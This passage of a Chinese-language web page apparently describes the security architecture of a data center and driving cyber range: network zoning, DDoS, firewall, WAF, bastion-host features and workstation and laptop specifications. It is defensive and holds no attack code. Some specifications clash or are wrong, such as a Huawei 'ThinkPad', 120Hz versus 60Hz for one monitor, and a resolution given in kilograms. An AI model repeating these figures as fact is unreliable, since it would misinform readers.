及相关系统的安全性和稳定性，抵御各类攻击和破坏，并确保系统的持续运行和信息的保护。</p><h3 id="安全架构设计"><a href="#安全架构设计" class="headerlink" title="安全架构设计"></a>安全架构设计</h3><p>安全通信网络能力涵盖网络架构、通信传输、可信验证方面。</p><p>安全通信网络能力是指在网络架构、通信传输和可信验证等方面保障通信的安全性。在网络架构方面，应考虑建立分层结构和安全策略，以实现网络资源的合理管理和访问控制。在通信传输方面，应采用加密协议和安全传输机制，确保数据在传输过程中的机密性、完整性和可用性。在可信验证方面，应使用身份认证、数字证书等技术手段，确认通信双方的身份和可信度，防止伪造和篡改等安全威胁。</p><p>网络域的划分应根据应用范围、重要性和所涉及信息的重要程度等因素进行合理设计。</p><p>网络域的划分是指将整个网络拆分为多个逻辑区域或子网，以实现对不同应用、重要性和信息的隔离和管理。划分网络域的目的是为了提高网络的安全性和可管理性。合理的网络域划分应考虑应用范围，将具有相似功能或需求的系统或服务划分到同一个网络域中，便于管理和控制。此外，还应根据重要性和所涉及信息的重要程度，将关键系统或敏感数据划分到独立的网络域中，以加强保护和隔离。</p><p>保证网络各个部分的带宽满足业务高峰期需要。</p><p>为了保证网络的正常运行和满足业务高峰期的需求，需要对网络各个部分的带宽进行合理规划和配置。带宽是指网络传输速率的衡量标准，它影响着网络的传输效率和性能。在规划网络带宽时，需要根据业务的特点和需求，合理分配带宽资源，确保每个部分都能满足其所需的带宽需求。在高峰期，可以通过动态调整带宽分配，优先满足关键业务的需求，保障网络的可用性和性能。</p><p>构建远程访问加密能力，在众测期间实现对白帽子的行为进行全面审计监控。</p><p>为了保障远程访问的安全性，可以建立远程访问加密能力。远程访问加密技术可以通过使用加密协议、身份认证和访问控制等手段，确保远程通信的机密性和完整性。在众测期间，为了对白帽子的行为进行全面审计监控，可以通过日志记录和行为分析等方法，对远程访问行为进行监控和审计。这样可以及时发现异常行为，并采取相应的措施进行响应和处置，提高系统的安全性和稳定性。</p><p>根据上述的安全域划分架构，对数据中心进行整体安全设计，如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6dd6a7898c5a63a67bbcb1ffc7bd2d38.png"></p><p>数据中心整体安全设计</p><h3 id="安全通信网络"><a href="#安全通信网络" class="headerlink" title="安全通信网络"></a>安全通信网络</h3><ul><li>网络安全是在当今数字化世界中维护数据完整性、保密性和可用性的重要组成部分。在设计网络架构时，必须从多个层面考虑安全性，包括但不限于数据在传输过程中的加密、对敏感数据的访问控制、以及确保通信双方身份的认证和授权机制。加密算法的使用是保护数据传输安全的基石，它通过复杂的数学运算确保即使数据在传输过程中被截获，未授权者也无法解读其内容。此外，访问控制策略确保只有得到授权的用户才能访问特定的网络资源，这通常涉及到多因素认证、权限管理和用户行为监控等技术。认证和授权机制的实施则进一步确保所有尝试访问系统的个体都能被准确地识别和验证，防止未授权的访问和潜在的内部威胁。</li><li>网络域的划分是确保网络安全和高效管理的关键策略。通过将网络按照业务功能、服务等级和安全需求进行逻辑或物理划分，组织可以更有效地监控和管理网络流量，同时限制潜在的安全威胁仅在局部范围内传播。例如，通过设置不同的虚拟局域网（VLANs），可以在不同部门或项目组之间建立安全边界，同时利用路由器和防火墙的访问控制列表（ACLs）来限制跨域访问，增强安全性。这种划分不仅有助于隔离敏感数据，减少跨网络的不必要通信，还能提升网络性能，确保关键业务系统的顺畅运行。</li><li>为了保证网络在业务高峰期的性能，必须对网络的带宽需求进行精确的评估和规划。这包括对网络流量的持续监控、预测未来增长趋势、以及及时升级网络设施以应对预期的负载。网络管理员需要定期进行网络性能评估，利用流量分析工具来识别流量模式，并据此调整网络配置，如优化路由协议、增加带宽容量或部署负载均衡器。同时，灾难恢复计划和冗余设计也是确保网络可用性的关键，特别是在面对硬件故障、服务攻击或其他突发事件时。通过对关键网络组件的冗余配置，可以在设备或路径出现故障时快速切换，保持业务的持续运行。</li><li>远程访问系统的安全构建是一个复杂的过程，它需要综合考虑用户身份验证、数据传输安全、终端安全以及网络访问控制等多个方面。在众测期间，特别需要对白帽子黑客的行为进行严格的审计和监控，以确保他们在探索系统漏洞时不会对系统造成不可预期的损害。这通常涉及到日志管理、行为分析、入侵检测系统（IDS）和入侵防御系统（IPS）的部署。此外，确保测试环境与生产环境的隔离也至关重要，以避免测试活动影响到正常的业务运行。通过使用虚拟私人网络（VPN）和防火墙来限制远程访问权限，以及实施端点保护策略，可以在不牺牲用户体验的前提下，保护企业资产免受不必要的风险。</li></ul><h3 id="安全区域边界"><a href="#安全区域边界" class="headerlink" title="安全区域边界"></a>安全区域边界</h3><p>安全域划分的目的是从信息安全的角度来对企业信息系统进行拆分。以业务系统为核心，从业务特性、技术特性方面分析各业务系统的安全需求和防护等级，进行适当的安全防护体系设计。</p><ul><li>安全区域边界的能力是为了确保网络环境的安全性，防止未授权的访问和潜在的网络攻击。边界防护作为首要防线，不仅要阻止不安全的流量进入网络，还要确保敏感数据不会泄露到外部环境。访问控制则通过一系列的身份验证和授权步骤来实现，确保只有合法用户和设备才能访问网络资源。此外，入侵防范系统（IPS）能够实时监控网络活动，自动识别并阻止潜在的攻击行为。恶意代码防护则涉及到防病毒、反间谍软件和其他恶意软件的防御措施，这些措施需要不断更新以对抗日益狡猾的恶意软件和零日攻击。</li><li>互联网边界安全是对抗外部威胁的关键环节。网络入侵防御系统（IDS）和分布式拒绝服务（DDoS）防护是保护网络不受恶意流量影响的重要组成部分。IDS监测所有进入和离开网络的数据包，寻找可能的攻击迹象，而DDoS防护则旨在识别并缓和大量的恶意流量，保障网络的正常运行。同时，网络边界还应具备能力阻断恶意访问和威胁URL，这通常通过部署先进的防火墙和网关设备来实现，这些设备能够根据安全策略对流量进行深度检查和过滤。</li><li>对于对外提供服务的系统，如网站和在线应用，安全防护能力尤为关键。这类系统常常面临网络攻击和数据泄露的风险，因此需要采取额外的安全措施。这些措施包括但不限于安全套接字层（SSL）加密、网页应用防火墙（WAF）和定期的安全漏洞扫描。SSL确保数据在传输过程中的加密，而WAF则保护应用免受跨站脚本（XSS）、SQL注入等常见攻击。定期的安全评估和漏洞扫描能够帮助识别并修补安全漏洞，从而降低被攻击的风险。</li><li>网络流量监测和高级威胁防御是现代网络安全的关键组成部分。通过部署先进的威胁检测和响应系统，安全团队能够对网络流量进行持续监控，及时发现并响应可疑活动。这些系统利用行为分析、沙箱技术和人工智能算法来检测复杂的攻击模式，包括APT（高级持续性威胁）和零日攻击。当可疑活动被检测到时，安全团队可以迅速采取行动，如隔离受影响的系统、分析攻击载荷和通报相关的威胁情报，从而防止或减轻安全事件的影响。</li></ul><h4 id="边界接入区"><a href="#边界接入区" class="headerlink" title="边界接入区"></a>边界接入区</h4><ul><li>互联网接入区</li></ul><p>承载组织与互联网的连接，组织向公共用户提供对外业务服务的通道。</p><ul><li>外联接入区</li></ul><p>承载组织与外部第三方机构的信息交换，如电子政务专网、监管机构、合作机构等。</p><ul><li>部接入区</li></ul><p>承载组织部的分支机构、灾备中心之间的信息交换，以及组织人员从外部接入的通道。</p><h4 id="外联接入区"><a href="#外联接入区" class="headerlink" title="外联接入区"></a>外联接入区</h4><p>外联接入区主要面临的威胁来自于外联机构，通常外联机构使用专线或者VPN连接到数据中心，访问特定的业务系统。对于外联接入区的安全设计主要从访问控制方面重点考虑。</p><ul><li>部署智慧防火墙，实现端口级的访问控制，并开启应用层防护功能，对来自外部机构的恶意代码、高级威胁等进行检测和拦截。</li></ul><h4 id="互联网接入区"><a href="#互联网接入区" class="headerlink" title="互联网接入区"></a>互联网接入区</h4><p>互联网接入区主要面临来自互联网的安全威胁，对于互联网接入区的安全设计主要从以下两方面考虑：</p><ol><li>防DDoS攻击（分布式拒绝服务攻击）。DDOS攻击分为带宽消耗型攻击（大流量攻击）和主机资源消耗型攻击，带宽消耗型攻击会对数据出口造成流量压力，极大浪费宝贵的带宽资源，严重增加核心设备的工作负荷，造成关键业务的中断或网络服务质量的大幅降低。主机资源消耗型攻击使服务器处理大量并发攻击请求，严重影响服务器存、数据库、CPU的处理性能。 DDoS攻击会造成门户、网络设备、虚拟服务器等性能均急剧下降，可能导致无常处理用户的正常访问请求，造成客户访问失败。</li><li>未知威胁检测与响应。互联网边界是威胁的重要入口之一，同时也是数据泄露的主要出口之一。尤其是当前APT攻击盛行，各类未知威胁对核心数据安全造成巨大的危害。网关层面应当具备对未知威胁的检测能力，并能实现联动响应机制，拦截掉威胁进出的路径。</li></ol><ul><li>在互联网边界部署抗DDoS系统，对来自外部的DDoS攻击进行实时的阻断。</li><li>部署智慧防火墙，实现高性能的应用层安全防护，以及与安全运营平台进行联动，实现网关处的未知威胁处置。</li></ul><h4 id="网络基础设施区"><a href="#网络基础设施区" class="headerlink" title="网络基础设施区"></a>网络基础设施区</h4><ul><li>核心汇聚区</li></ul><p>数据中心的网络汇聚中心，各个区域之间的数据流传都会经过核心汇聚区。通常在此区域进行网络流量的安全监控。</p><ul><li>区域接入区</li></ul><p>主要是各个安全区部接入的路由交换设备，通常在此区域部署网络接入控制等措施。</p><h4 id="业务接入区"><a href="#业务接入区" class="headerlink" title="业务接入区"></a>业务接入区</h4><ul><li>一般服务区</li></ul><p>用于存放防护级别较低，需直接对外提供服务的信息资产，如Web应用、业务前置机、办公服务器等，一般服务区与外界有直接连接，同时不能够访问核心数据区（避免被作为攻击核心数据区的跳板）。</p><ul><li>重要服务区</li></ul><p>用于存放级别较高，不需要直接对外提供服务的信息资产，如生产应用服务器等，重要服务区一般通过一般服务区与外界连接，并可以直接访问核心数据区。</p><ul><li>核心数据区</li></ul><p>用于存放级别非常高的信息资产，如核心数据库等，外部对核心区的访问需要通过重要服务区跳转。</p><h4 id="运维管理区"><a href="#运维管理区" class="headerlink" title="运维管理区"></a>运维管理区</h4><p>运维管理区通常承载网络管理、安全管理和业务运维等应用，运维人员通过本区域的管理平台对网络设备、服务器、安全产品进行管理。如各类设备的日志存储、安全管理平台、各类监控系统等。</p><h4 id="内部接入区"><a href="#内部接入区" class="headerlink" title="内部接入区"></a>内部接入区</h4><p>内部接入区主要面临的威胁来自于远程接入带来的风险，如传输过程的信道监听、员工远程接入后的权限滥用等。部接入区的安全设计主要考虑远程安全接入中的访问控制、权限管理、传输加密等方面。</p><ul><li>部署VPN接入网关，实现对分支机构接入的访问控制、权限管理，并且采用链路加密技术保证敏感信息的传输安全。</li><li>部署智慧防火墙，支持对穿过防火墙的SSL协议进行解密，并对解密后的数据提供防护过滤，如攻击防护、入侵检测、病毒防护、容过滤等。</li></ul><h4 id="核心汇聚区"><a href="#核心汇聚区" class="headerlink" title="核心汇聚区"></a>核心汇聚区</h4><p>核心汇聚区的安全设计主要考虑从全网流量中对各类威胁进行识别检测，及时发现攻击行为并向安全运营中心进行告警。</p><p>本区域安全设计如下图所示：</p><ul><li>在核心交换机上旁路部署天眼网络威胁传感器。通过流量镜像接收全网的通信数据流，对各类网络行为进行还原，从中识别各类已知威胁生成告警；还可以通过与威胁情报中心下发到本地的威胁情报进行比对，识别未知威胁；同时全量网络数据存储在本地大数据分析平台，可以对威胁进行溯源。</li><li>部署文件威胁鉴定器。网络威胁传感器识别到网络流量中的文件传输行为后，会将文件还原并发送至文件威胁鉴定器，进行深度分析。文件威胁鉴定器会对PE文件、脚本文件等进行模拟运行，通过文件运行过程中执行的操作行为进一步识别潜在的威胁。</li></ul><h4 id="一般服务区"><a href="#一般服务区" class="headerlink" title="一般服务区"></a>一般服务区</h4><p>一般服务区通常承载了对外的Web类应用，主要面临的威胁有以下两方面：</p><ol><li>应用安全风险，主要由于应用软件的漏洞造成。任何一种软件或多或少存在一定脆弱性，安全漏洞可视作已知系统脆弱性。这种安全漏洞可分为两种：一种是由于操作系统本身设计缺陷带来的漏洞，它将被运行在这个系统上的应用程序所继承，另一种是应用软件程序安全漏洞，很常见，更要引起广泛关注。</li><li>主机安全风险。包括两方面：一是物理机与虚拟机操作系统的恶意代码防。二是由于服务器虚拟化技术带来的新型风险，如东西向流量的访问控制、虚拟机逃逸漏洞、虚拟机漂移导致安全策略失效等。</li></ol><h3 id="计算环境能力"><a href="#计算环境能力" class="headerlink" title="计算环境能力"></a>计算环境能力</h3><ul><li>确保承载业务运行的主机和服务器的安全性是保护组织免受网络威胁的关键 ，包括：</li></ul><ol><li>防病毒和反恶意软件，</li><li>操作系统和应用程序加固，</li><li>入侵检测和防御系统（IDS/IPS），</li><li>防火墙配置。</li></ol><ul><li>要对核心运维及测试终端进行全面防护和审计，并实现对终端的防病毒、软件分发及正版化管理、终端运维管控、终端行为审计管理等能力</li><li>要对核心运维及测试终端进行全面防护和审计，并实现对终端的防病毒、软件分发及正版化管理、终端运维管控、终端行为审计管理等能力，需要以下步骤和措施：</li></ul><ol><li>集成端点安全解决方案</li><li>软件分发和管理</li><li>统一端点管理(UEM)</li><li>访问控制和身份验证</li><li>数据保护和加密</li><li>网络安全</li></ol><ul><li>要具备对系统漏洞全面监测的能力，可以采取以下措施：</li></ul><ol><li>定期漏洞扫描</li><li>持续的漏洞评估</li><li>订阅漏洞信息服务</li><li>补丁管理</li><li>配置管理</li><li>威胁情报集成</li><li>安全评估和渗透测试</li><li>员工培训和意识提升</li></ol><ul><li>为了对业务数据库的访问行为进行审计和风险评估，以保障核心数据的安全，需要实施一系列的策略和工具。</li></ul><ol><li>数据库访问控制</li><li>审计策略制定</li><li>数据库活动监控</li><li>日志管理</li><li>定期审计和检查</li><li>风险评估</li><li>数据分类和标签</li></ol><p>7.</p><h3 id="安全产品防护能力"><a href="#安全产品防护能力" class="headerlink" title="安全产品防护能力"></a>安全产品防护能力</h3><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p>防火墙选用1台华为USG6303E-AC，该防火墙是一种高性能网络安全设备，主要用于监控和控制网络流量，以保护网络免受未经授权的访问、恶意攻击和不良内容的影响。防火墙通过建立规则和策略，过滤和阻止不符合规则的网络流量，从而维护网络的安全性和完整性。</p><p>该设备具备如下指标参数信息：</p><ol><li>采用ARM架构，ARM架构是一种精简指令集计算机（RISC）架构，广泛应用于移动设备、嵌入式系统、服务器和超级计算机中。</li><li>支持一对多、多对一，多对多的NAT能力、IPSec、L2TP、GRE、SSL等多种VPN技术、IPv6协议、虚拟防火墙功能、用户行为审计、网络数据统计评估能力，这是一组网络功能，旨在提供灵活的地址转换、安全的远程连接、下一代IP支持、隔离和监控的虚拟化安全措施以及对用户活动和网络流量的详细分析。</li></ol><p>性能参数如下：</p><ol><li>数据吞吐量40Gbps，最大并发连接数1600万，每秒新建连接数50万，这是一款高性能网络设备的规格，能够处理每秒40吉比特的数据传输，支持高达1600万个同时活跃连接，并能每秒创建50万个新连接。</li></ol><h4 id="Web应用防护系统-WAF"><a href="#Web应用防护系统-WAF" class="headerlink" title="Web应用防护系统(WAF)"></a>Web应用防护系统(WAF)</h4><p>WEB应用防护系统采用国利自主研发的WAF防护管理平台，该平台是一种专门用于保护Web应用程序免受恶意攻击的安全设备或软件。WAF通过监控、检测和阻止对Web应用程序的攻击，提供了一层额外的安全防护。</p><p>以下是WEB应用防护系统的一些主要功能和特点：</p><p>1.攻击检测和阻止：WAF可以检测和阻止多种类型的Web应用程序攻击，包括SQL注入、跨站脚本攻击（XSS）、跨站请求伪造（CSRF）等。它使用各种技术和算法来分析和识别恶意请求，并阻止它们对应用程序的访问。</p><p>2.威胁情报和漏洞库：WAF可以使用威胁情报和漏洞库来更新和识别最新的攻击模式和漏洞。这样可以及时应对新的安全威胁，并提供实时的保护。</p><p>3.访问控制和身份验证：WAF可以实施访问控制策略，限制特定用户或IP地址的访问。它还可以支持身份验证机制，确保只有经过身份验证的用户才能访问Web应用程序。</p><p>4.内容过滤和数据保护：WAF可以对传入和传出的Web应用程序数据进行过滤和检查，以防止恶意内容的传输。它可以检测和阻止包含敏感信息的数据，如信用卡号码、社会安全号码等。</p><p>5.日志和报告：WAF可以生成详细的日志和报告，记录攻击尝试、阻止情况和安全事件。这些日志和报告可以用于安全审计、事件响应和安全性分析。</p><p>6.自定义规则和策略：WAF通常提供灵活的配置选项，允许管理员根据特定的应用程序需求自定义规则和策略。这样可以根据具体的应用程序特点和安全需求进行定制化的防护。</p><p>该平台具备如下指标参数信息：</p><ol><li>系统能够通过自学习机制识别正常的访问模式，并创建一种树形结构来映射访问源。这有助于了解网络流量的分布情况，并为进一步的安全分析提供基础。</li><li>系统提供了黑白名单功能，允许管理员明确指定哪些源地址是被信任的（白名单），哪些是已知的恶意源或不被信任的（黑名单），以便于更有效地管理网络访问控制。</li><li>当系统判断某些流量为非法或恶意时，它能够自动执行阻断操作，防止这些流量对网络资源造成影响或破坏。</li><li>在旁路镜像模式下，系统能够不影响网络的正常运行，同时执行攻击阻断、端口联动以及应用虚拟补丁等功能，以提高网络的安全性。</li><li>性能参数规定了系统应具备的处理能力，确保即使在高流量条件下也能保持高效的安全监控。</li><li>具体到性能参数，系统应能处理高达1Gbps的HTTP流量，同时支持高达60万的HTTP并发连接数，以及每秒能够新建4万个HTTP连接。</li></ol><h4 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h4><p>堡垒机选用中孚信安的zfbast-H，该堡垒机可以用于增强网络安全性，它位于网络的边界或关键位置，作为安全访问点来管理和控制对内部网络的访问。</p><p>以下是该堡垒机的一些主要功能和特点：</p><p>1.安全访问控制：堡垒机充当了访问内部网络的唯一入口，所有对内部服务器的访问都必须经过堡垒机进行认证和授权。它可以实施严格的访问控制策略，只允许经过身份验证的用户或授权的设备进行访问。</p><p>2.身份验证和授权：堡垒机提供了强大的身份验证机制，确保只有经过身份验证的用户才能访问内部网络。它可以支持多种身份验证方式，如用户名/密码、双因素身份验证、证书等。同时，堡垒机可以根据用户的身份和权限级别进行授权，限制其对内部资源的访问权限。</p><p>3.审计和日志记录：堡垒机可以记录所有通过它进行的访问和操作，包括登录、命令执行、文件传输等。这些日志可以用于安全审计、事件调查和追踪，帮助发现潜在的安全问题和威胁。</p><p>4.安全隔离：堡垒机可以实现内外网络的逻辑隔离，将来自外部网络的流量限制在堡垒机内部，有效防止恶意流量进入内部网络。它还可以使用虚拟化或容器化技术，将不同用户的访问隔离开来，防止攻击者通过一台受感染的服务器访问其他服务器。</p><p>5.漏洞管理和补丁管理：堡垒机可以对内部服务器进行漏洞扫描和补丁管理，确保内部服务器的安全性和可靠性。它可以检测并及时修复服务器上的漏洞，减少潜在的攻击面。</p><p>该堡垒机满足一下参数：</p><ol><li>提供的端口包括6个千兆电口，4个千兆光口</li><li>可管理设备数量1000个，运维用户无限制条件</li><li>支持多因子认证，包括手机令牌、手机短信、动态令牌、国密USBKey、指纹识别等方式，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/fd62b1b07741d4fbad2134fd7e52701f.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/69e0338ea571294b9e1f3efd981df3a0.png"></p><ol><li>系统内置部门管理员、策略管理员、审计管理员、运维员等角色，并支持按模块和功能自定义角色权限，便于管理，用于复杂的业务场景需求支持角色权限细粒度划分，包括新建部门、安全配置、网络配置、HA配置、端口配置、外发配置、认证配置、工单配置、告警配置、系统风格等权限划分，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0f74fa45f4a3846c0a44debbd138eee2.png"></p><ol><li>支持对MySQL、Oracle和达梦数据库的访问操作进行控制，可基于库、表、命令实现对数据库操作的细粒度访问控制，执行动作包括但不限于断开连接、拒绝执行、动态授权、允许执行，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a2b94bfb9122d74300786047a1fa6835.png"></p><ol><li>支持以部门、资源账户、账户组、时间、改密周期、改密方式生成详细的改密计划，到期自动执行，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/81efc1f0a9130ad4369ea1a07d12ae38.png"></p><ol><li>支持H5运维过程中通过群发命令，实现同时运维多台资源设备，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0a052775db2344d46f388ea4a88a0261.png"></p><ol><li>支持在线回放运维人员对资源的操作过程，并可以对播放速度进行调整，支持拖动、暂停、停止、跳过空闲、重新播放、截屏、切换会话等操作，支持运维记录按照允许 执行、动态授权、拒绝执行、断开连接等进行筛选，支持文件传输按照上传文件（夹）、下载文件（夹）、重命名文件（夹）、删除文件（夹）、创建文件夹进行筛选，支持审计协同用，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/13be18b6c482abe7d44d82e922a14e0f.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5fbde35ac637babefc4e3f348392bbec.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/83f4686c95d0876147321110b0827d82.png" alt="IMG_256"></p><ol><li>支持对用户从主机上下载或上传到主机的文件进行保存，可灵活设置保存文件的大小（支持单文件或会话级别限制），可自动计算文件的SHA256值，截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c3d1d65fdecb2681317e8340325cd5d6.png"></p><h2 id="其他资产设备"><a href="#其他资产设备" class="headerlink" title="其他资产设备"></a>其他资产设备</h2><p>8.</p><h3 id="工作站"><a href="#工作站" class="headerlink" title="工作站"></a>工作站</h3><p>工作站选用19台品牌为：戴尔（DELL），型号为：Precision 3571的工作站，该工作站是一种专门设计用于高性能计算和专业应用的计算机系统。它具有以下功能和特点：</p><p>1. 强大的性能：戴尔Precision 3571工作站采用高性能的处理器、大容量的内存和快速的存储设备，以提供卓越的计算性能和数据处理能力。这使得它能够处理复杂的计算任务、大规模的数据分析和渲染等高要求的工作负载。</p><p>2. 图形处理能力：许多戴尔工作站配备了专业级的图形处理单元（GPU），用于处理图形密集型任务，如计算机辅助设计（CAD）、虚拟现实（VR）、视频编辑和动画制作。这些强大的图形处理能力可以提供流畅的图形表现和渲染速度。</p><p>3. 扩展性和灵活性：戴尔工作站提供了丰富的扩展选项和灵活的配置选择，以满足不同用户的需求。它们通常具有多个扩展插槽和接口，可以支持添加额外的存储设备、图形卡、网络适配器等，以满足特定应用的要求。</p><p>4. 可靠性和稳定性：戴尔工作站经过严格的质量控制和测试，以确保其可靠性和稳定性。它们通常采用耐用的组件和散热设计，以保持良好的性能和长时间的稳定运行。</p><p>5. 安全性：戴尔工作站提供了多种安全功能和选项，以保护用户的数据和系统安全。这些功能包括硬件级的安全芯片、数据加密、远程管理和访问控制等，帮助用户防止数据泄露和未经授权的访问。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dc2ae897b1f7a8b4e660264962a2e227.png"></p><p>该工作站具备如下指标参数信息：</p><ol><li>显卡预装windos11操作系统</li><li>配置CPU性能i7-13700H</li><li>配置CPU加速频率5.0GHz</li><li>配置HDMI 2.0接口、SD读卡器接口</li><li>配置2个USB3.0接口</li><li>配置RJ45接口1个</li><li>配置1个ThunderBolt4.0</li><li>配置内存64GB DDR4</li><li>配置1TB SSD</li><li>配置显卡NVIDIA® Geforce® RTX4060 、8G独显</li><li>配置支持蓝牙BT5.0</li><li>配置Linux虚拟机环境，并且保证运行靶场、运维所需的硬件软件</li><li>满足对车辆渗透测试所需的软件及环境</li></ol><h3 id="显示器"><a href="#显示器" class="headerlink" title="显示器"></a>显示器</h3><p>显示器选用26台品牌为：戴尔，型号为：P3223QE的显示器，该显示器具有以下功能和特点：</p><p>这款显示器拥有31.5英寸的大屏幕，提供多种视频输入选项，包括传统的VGA接口和更现代的HDMI接口，确保了与各种设备的兼容性。它的刷新率为120Hz，这意味着屏幕每秒可以刷新120次，为用户提供了流畅的视觉体验，特别是在观看高速运动的画面或进行游戏时。重量为4.8公斤，说明这款显示器在便携性和稳定性之间取得了平衡。此外，它支持4K分辨率（通常指的是3840×2160像素），能够提供清晰、详细的图像质量，非常适合高清视频观看、专业图像处理和游戏等场景。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/480e39467fe54a4b30b3a122d4fc9863.png"></p><p>功能参数如下：</p><ol><li>屏幕31.5英寸</li><li>支持接口VGA、HDMI</li><li>刷新频率60Hz</li><li>满足分辨率不低于10kg</li><li>满足分辨率4K</li></ol><h3 id="移动终端"><a href="#移动终端" class="headerlink" title="移动终端"></a>移动终端</h3><p>移动终端选用8台品牌为：华为，型号为：ThinkPad T14 的移动终端，这款电脑是一台性能强大的便携式设备，运行Windows操作系统，配备了Intel的i7-1260P处理器，该处理器的基础主频为2.1GHz，可以在需要时提供更高的性能。它拥有一个14.5英寸的显示屏，分辨率为2240×1400，这提供了较高的像素密度，使得屏幕显示清晰且细节丰富。</p><p>在接口方面，该电脑支持HDMI 2.0接口，这允许用户连接到高分辨率的外部显示器或电视。它还配备了SD读卡器接口，方便从相机等设备直接读取SD卡。此外，有两个USB 3.0接口用于连接各种外部设备，如USB驱动器、打印机等。</p><p>网络连接方面，它有一个RJ45接口，支持有线网络连接，以及一个Thunderbolt 4.0接口，后者提供高速的数据传输和视频输出功能。内存方面，这台电脑装备了64GB DDR4内存，对于多任务处理和高性能要求的应用来说是非常充裕的。</p><p>存储方面，它有1TB的固态硬盘(SSD)，这不仅提供了大量的存储空间，还因为SSD的速度比传统硬盘快，从而提高了整体的系统响应速度。</p><p>显卡配置为NVIDIA® Geforce® MX550，拥有2G独立显存，这款显卡虽然不是面向高端游戏的顶级显卡，但对于日常工作、视频播放和一些不是特别要求高的游戏来说已经足够。</p><p>最后，这台电脑还支持蓝牙5.0技术，这是一种无线通信标准，可以连接鼠标、键盘、耳机等蓝牙设备，具有更好的连接范围和传输速率。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dc25bb8674c46d17f54a712408f6d68e.png"></p><ul><li>该移动终端具有以下功能和特点：</li></ul><ol><li>配置windos操作系统</li><li>配置CPU性能i7-1260P</li><li>配置CPU主频2.1GHz</li><li>配置屏幕14英寸</li><li>配置分辨率2240 × 1400</li><li>配置HDMI 2.0接口、SD读卡器接口</li><li>配置2个USB3.0接口</li><li>配置RJ45接口1个</li><li>配置1个ThunderBolt4.0</li><li>配置内存64GB DDR4</li><li>硬盘配置1TB SSD</li><li>显卡配置NVIDIA® Geforce® MX550 、2G显存</li><li>配置蓝牙BT5.0</li></ol><p><strong>提供1台品牌为：Apple，型号为：macbook pro的移动终端;</strong></p><p>这款搭载macOS操作系统的笔记本电脑搭载了Apple的M2 Pro芯片，是一款针对性能和能效进行了优化的处理器。它拥有12核心的中央处理器（CPU），可以提供强大的多任务处理能力和高效的能源管理。此外，它还配备了19核心的图形处理器（GPU），适合执行图形密集型任务，如视频编辑、3D渲染和高级游戏。</p><p>这款电脑还包含了一个16核的神经网络引擎，这是专门为机器学习任务设计的，可以加速各种AI处理功能，如语音识别、图像处理和模式识别。</p><p>屏幕方面，它配备了16英寸的视网膜XDR显示屏，这种显示屏以其高分辨率、高亮度、高对比度和广色域而闻名，为用户提供了令人印象深刻的视觉体验。显示屏支持10亿色彩，可以展现极为精准的色彩和细节。</p><p>在视频编解码能力方面，这款电脑支持H.264、HEVC、ProRes和ProRes RAW硬件加速，这意味着它可以快速高效地处理和编辑高分辨率视频内容，特别是对于专业视频制作人员来说非常有用。</p><p>内存为32GB，足以处理大多数高级应用和多任务操作。1TB的固态硬盘（SSD）提供了快速的存储解决方案，以及充足的空间来存储文件、应用程序和媒体内容。</p><p>连接性方面，这款电脑支持1个HDMI端口和3个USB-C端口，这些USB-C端口可能支持Thunderbolt 4，提供高速数据传输和多功能用途。此外，它还支持杜比视界、HDR10和HLG，可以显示HDR画质，这使得观看高动态范围内容时能够得到更好的图像质量。</p><p>在无线通信方面，电脑支持最新的Wi-Fi 6E (802.11ax)技术，提供更快的网络速度和更好的连接稳定性，以及蓝牙5.3，用于连接各种外部设备。</p><p>工作温度范围是10°C至35°C（50°F至95°F），存放温度范围是–25°C至45°C（–13°F至113°F），这表明它可以在多种环境下正常工作。</p><p>最后，这款电脑配备了100瓦时的锂聚合物电池，这种电池容量在笔记本电脑中属于较高的，能够提供长时间的电池续航，适合需要远离电源插座工作的用户。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/79399b42af9b129e74acdbd77dbb2f6d.png"></p><ul><li>功能参数如下：</li></ul><ol><li>支持macOS操作系统</li><li>配置处理器Apple M2 Pro</li><li>配置12核中央处理器</li><li>配置19核图像处理器</li><li>配置16核神经网络引擎</li><li>配置屏幕尺寸16英寸</li><li>提供视网膜 XDR 显示屏</li><li>支持 H.264、HEVC、ProRes 和 ProRes RAW 硬件加速</li><li>配置内存32G</li><li>配置硬盘1TB SSD</li><li>配置1个HDMI端口</li><li>配置4个USB-C端口</li><li>配置初始分辨率下10亿色彩</li><li>支持的格式包括 HEVC、H.264 和 ProRes</li><li>支持杜比视界、HDR10 和 HLG，并可显示 HDR 画质</li><li>支持Wi-Fi 6E (802.11ax)<a href="https://www.apple.com.cn/macbook-pro-14-and-16/specs/#footnote-5">5</a></li><li>支持蓝牙5.3</li><li>工作温度：10°C 至 35°C (50°F 至 95°F)</li><li>存放温度：–25°C 至 45°C (–13°F 至 113°F)</li><li>提供于100 瓦时锂聚合物电池</li></ol><h1 id="智能驾驶网络靶场沙盘"><a href="#智能驾驶网络靶场沙盘" class="headerlink" 